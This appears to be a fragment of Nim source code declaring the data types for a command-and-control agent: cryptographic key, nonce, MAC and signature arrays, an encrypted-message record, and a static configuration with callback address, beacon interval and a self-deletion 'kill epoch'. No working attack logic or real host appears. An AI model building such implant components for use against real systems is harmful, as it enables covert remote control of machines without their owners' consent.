
type
  Hash = array[64, byte]
  Key = array[32, byte]
  Nonce = array[24, byte]
  Mac = array[16, byte]
  Signature = array[64, byte]

type
  EncObj* = object
    publicKey*: Key
    nonce*:     Nonce
    mac*:       Mac
    cipherLen*:  int
    cipherText*: seq[byte]

type
  StaticConfig* = ref object
    buildID*: string      #generated on build
    deploymentID*: string #generated on deployment
    killEpoch*: int32  #what point should the agent stop calling back and delete
    interval*: int32   #how often should the agent call back
    callback*: string  #where the C2 is 